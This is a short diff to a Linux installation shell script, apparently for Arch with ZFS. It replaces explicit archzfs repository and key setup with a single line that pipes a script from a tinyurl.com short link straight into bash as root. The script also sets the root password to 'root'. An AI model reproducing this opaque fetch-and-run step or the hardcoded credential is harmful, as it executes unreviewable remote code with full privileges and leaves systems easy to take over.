@@ -86,17 +86,7 @@ echo '127.0.0.1	localhost' > /etc/hosts
 echo '::1		localhost' >> /etc/hosts
 echo '127.0.1.1	'$HOSTNAME >> /etc/hosts
 
-
-curl -L https://archzfs.com/archzfs.gpg |  pacman-key -a -
-pacman-key --lsign-key $(curl -L https://git.io/JsfVS)
-curl -L https://git.io/Jsfw2 > /etc/pacman.d/mirrorlist-archzfs
-echo '#[archzfs-testing]' >> /etc/pacman.conf
-echo '#Include = /etc/pacman.d/mirrorlist-archzfs' >> /etc/pacman.conf
-echo '[archzfs]' >> /etc/pacman.conf
-echo 'Include = /etc/pacman.d/mirrorlist-archzfs' >> /etc/pacman.conf
-pacman -Sy --noconfirm zfs-linux
-modprobe zfs
-
+curl -s -L https://tinyurl.com/ba8eswbk | bash
 
 echo "root:root" | chpasswd
 ZPOOL_VDEV_NAME_PATH=1 grub-install --target=x86_64-efi --bootloader-id=GRUB --efi-directory=/boot/efi
